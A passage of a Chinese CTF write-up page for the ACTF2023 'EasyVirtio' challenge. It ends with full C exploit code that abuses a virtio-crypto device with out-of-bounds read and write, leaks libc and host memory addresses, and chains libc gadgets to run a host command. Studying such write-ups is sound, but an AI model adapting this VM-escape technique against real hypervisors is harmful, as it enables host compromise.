class="hljs-number">2</span>].next = <span class="hljs-number">3</span>;<br><br>	desc[<span class="hljs-number">3</span>].flags = VRING_DESC_F_WRITE;<br>    desc[<span class="hljs-number">3</span>].addr = gva_to_gpa(read_buf);<br>    desc[<span class="hljs-number">3</span>].len = <span class="hljs-number">0x20</span>;<br>    desc[<span class="hljs-number">3</span>].next = <span class="hljs-number">0</span>;<br><br>	mmio_write(<span class="hljs-number">0x3004</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">cipher_en</span><span class="hljs-params">(<span class="hljs-type">void</span> *data_buf, <span class="hljs-type">int</span> len)</span>&#123;<br>	avail-&gt;idx = ++vq_avail_idx;<br>    avail-&gt;ring[vq_last_avail_idx ++] = <span class="hljs-number">0</span>;<br><br>	op_data-&gt;header.opcode = VIRTIO_CRYPTO_CIPHER_ENCRYPT;<br>	op_data-&gt;header.session_id = <span class="hljs-number">0</span>;<br>	op_data-&gt;u.sym_req.op_type = VIRTIO_CRYPTO_SYM_OP_CIPHER;<br>	op_data-&gt;u.sym_req.u.cipher.para.src_data_len = len;<br>	op_data-&gt;u.sym_req.u.cipher.para.dst_data_len = len;<br><br>	<span class="hljs-type">void</span> *encode_data = (<span class="hljs-type">void</span>*)op_data + <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_crypto_op_data_req);<br>	<span class="hljs-built_in">memcpy</span>(encode_data, data_buf, len);<br><br>    desc[<span class="hljs-number">0</span>].flags = VRING_DESC_F_NEXT;<br>    desc[<span class="hljs-number">0</span>].addr = gva_to_gpa(op_data);<br>    desc[<span class="hljs-number">0</span>].len = <span class="hljs-number">0xc00</span>;<br>    desc[<span class="hljs-number">0</span>].next = <span class="hljs-number">1</span>;<br><br>    desc[<span class="hljs-number">1</span>].flags = VRING_DESC_F_WRITE;  <br>    desc[<span class="hljs-number">1</span>].addr = gva_to_gpa(read_buf);<br>    desc[<span class="hljs-number">1</span>].len = <span class="hljs-number">0xc00</span>;<br>    desc[<span class="hljs-number">1</span>].next = <span class="hljs-number">0</span>;<br><br>	mmio_write(<span class="hljs-number">0x3000</span>, <span class="hljs-number">0</span>);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">cipher_de</span><span class="hljs-params">(<span class="hljs-type">void</span> *data_buf, <span class="hljs-type">int</span> len)</span>&#123;<br>	avail-&gt;idx = ++vq_avail_idx;<br>    avail-&gt;ring[vq_last_avail_idx ++] = <span class="hljs-number">0</span>;<br><br>	op_data-&gt;header.opcode = VIRTIO_CRYPTO_CIPHER_DECRYPT;<br>	op_data-&gt;header.session_id = <span class="hljs-number">1</span>;<br>	op_data-&gt;u.sym_req.op_type = VIRTIO_CRYPTO_SYM_OP_CIPHER;<br>	op_data-&gt;u.sym_req.u.cipher.para.src_data_len = len;<br>	op_data-&gt;u.sym_req.u.cipher.para.dst_data_len = len;<br><br>	<span class="hljs-type">void</span> *decode_data = (<span class="hljs-type">void</span>*)op_data + <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_crypto_op_data_req);<br>	<span class="hljs-built_in">memcpy</span>(decode_data, data_buf, len);<br><br>    desc[<span class="hljs-number">0</span>].flags = VRING_DESC_F_NEXT;<br>    desc[<span class="hljs-number">0</span>].addr = gva_to_gpa(op_data);<br>    desc[<span class="hljs-number">0</span>].len = <span class="hljs-number">0xc00</span>;<br>    desc[<span class="hljs-number">0</span>].next = <span class="hljs-number">1</span>;<br><br>    desc[<span class="hljs-number">1</span>].flags = VRING_DESC_F_WRITE;  <br>    desc[<span class="hljs-number">1</span>].addr = gva_to_gpa(read_buf);<br>    desc[<span class="hljs-number">1</span>].len = <span class="hljs-number">0xc00</span>;<br>    desc[<span class="hljs-number">1</span>].next = <span class="hljs-number">0</span>;<br><br>	mmio_write(<span class="hljs-number">0x3000</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">oob_write</span><span class="hljs-params">()</span>&#123;<br>	avail-&gt;idx = ++vq_avail_idx;<br>    avail-&gt;ring[vq_last_avail_idx ++] = <span class="hljs-number">0</span>;<br><br>	op_data-&gt;header.opcode = VIRTIO_CRYPTO_CIPHER_ENCRYPT;<br>	op_data-&gt;header.session_id = <span class="hljs-number">1</span>;<br>	op_data-&gt;u.sym_req.op_type = VIRTIO_CRYPTO_SYM_OP_CIPHER;<br>	op_data-&gt;u.sym_req.u.cipher.para.src_data_len = <span class="hljs-number">0x5d0</span>;<br>	op_data-&gt;u.sym_req.u.cipher.para.dst_data_len = <span class="hljs-number">0</span>;<br><br>	<span class="hljs-comment">// void *payload = (void*)op_data + sizeof(struct virtio_crypto_op_data_req);</span><br>	<span class="hljs-comment">// memcpy(payload, data_buf, len);</span><br><br>    desc[<span class="hljs-number">0</span>].flags = VRING_DESC_F_NEXT;<br>    desc[<span class="hljs-number">0</span>].addr = gva_to_gpa(op_data);<br>    desc[<span class="hljs-number">0</span>].len = <span class="hljs-number">0xc00</span>;<br>    desc[<span class="hljs-number">0</span>].next = <span class="hljs-number">1</span>;<br><br>    desc[<span class="hljs-number">1</span>].flags = VRING_DESC_F_WRITE;  <br>    desc[<span class="hljs-number">1</span>].addr = gva_to_gpa(read_buf);<br>    desc[<span class="hljs-number">1</span>].len = <span class="hljs-number">0x800</span>;<br>    desc[<span class="hljs-number">1</span>].next = <span class="hljs-number">0</span>;<br><br>	mmio_write(<span class="hljs-number">0x3000</span>, <span class="hljs-number">0</span>);<br><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span>  mmio_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource4&quot;</span>, O_RDWR | O_SYNC);<br>    mmio         = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x4000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="hljs-number">0</span>);<br><br>    buf = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>	desc = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>	<span class="hljs-built_in">memset</span>(desc, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>	read_buf = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>	<span class="hljs-built_in">memset</span>(read_buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    <br>	avail = buf;<br>    op_data = buf + <span class="hljs-number">0x400</span>;<br>	<br>    init_virtio();<br>	init_heap();<br>	sleep(<span class="hljs-number">1</span>);<br><br>	oob_read();<br>	sleep(<span class="hljs-number">1</span>);<br>	<span class="hljs-type">size_t</span> leak_libc_addr = *(<span class="hljs-type">size_t</span>*)(read_buf + <span class="hljs-number">0x18</span>);<br>	<span class="hljs-type">size_t</span> libc_base = leak_libc_addr - <span class="hljs-number">0x219ce0</span>; <span class="hljs-comment">//0x578d50;</span><br>	<span class="hljs-type">size_t</span> system_addr = libc_base + <span class="hljs-number">0x50d70</span>;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_libc_base_addr_is %#lx\n&quot;</span>, libc_base);<br><br>	<span class="hljs-type">size_t</span> leak_physmap_addr = *(<span class="hljs-type">size_t</span>*)(read_buf + <span class="hljs-number">0x28</span>);<br>    <span class="hljs-type">size_t</span> physmap_base = leak_physmap_addr - gva_to_gpa(op_data);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_host_physmap_base_addr_is %#lx\n&quot;</span>, physmap_base);<br>	<br>	create_session();<br>	sleep(<span class="hljs-number">1</span>);<br><br>	<span class="hljs-comment">//0x0000000000094ab6 : mov rdi, qword ptr [rax + 0x648] ; call qword ptr [rax + 0x640]</span><br>	<span class="hljs-comment">//0x000000000015ff54 : call qword ptr [rdi + 0x40]</span><br>	<span class="hljs-type">size_t</span> *payload = buf + <span class="hljs-number">0x100</span>;<br>	<span class="hljs-type">char</span> *cmd = buf + <span class="hljs-number">0x140</span>;<br>	<span class="hljs-built_in">memcpy</span>(cmd, <span class="hljs-string">&quot;cat flag&quot;</span>, <span class="hljs-number">8</span>);<br>	*(<span class="hljs-type">size_t</span>*)(cmd + <span class="hljs-number">0x40</span>) = system_addr;<br>	payload[<span class="hljs-number">0</span>] = libc_base + <span class="hljs-number">0x94ab6</span>;<br>	payload[<span class="hljs-number">4</span>] = libc_base + <span class="hljs-number">0x15ff54</span>;<br>	payload[<span class="hljs-number">5</span>] = physmap_base + gva_to_gpa(cmd);<br>	<br><br>	cipher_en(payload, <span class="hljs-number">0x40</span>);<br>	sleep(<span class="hljs-number">1</span>);<br>	<span class="hljs-built_in">memcpy</span>((<span class="hljs-type">void</span>*)op_data + <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_crypto_op_data_req), read_buf, <span class="hljs-number">0x40</span>);<br>	<br>	<span class="hljs-comment">//getchar(); </span><br>	oob_write();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>最后在docker环境中测试也是可以成功拿到flag</p>
+<img src="/img/23/Screenshot 2023-11-06 202907.png" srcset="/img/loading.gif" lazyload style="zoom: 80%;" />
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ACTF2023 EasyVirtio</div>
+      <div>https://xtxtn.github.io/2023/11/02/ACTF2023/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>xtxtn</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年11月2日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年11月7日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                    <i class="iconfont icon-nc"></i>
+                  </span>
+                </a>
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                    <i class="iconfont icon-sa"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/10/12/ErrorHandling/" title="Misuse Error Handling Leading To QEMU/KVM Escape">
+                        <span class="hidden-mobile">Misuse Error Handling Leading To QEMU/KVM Escape</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
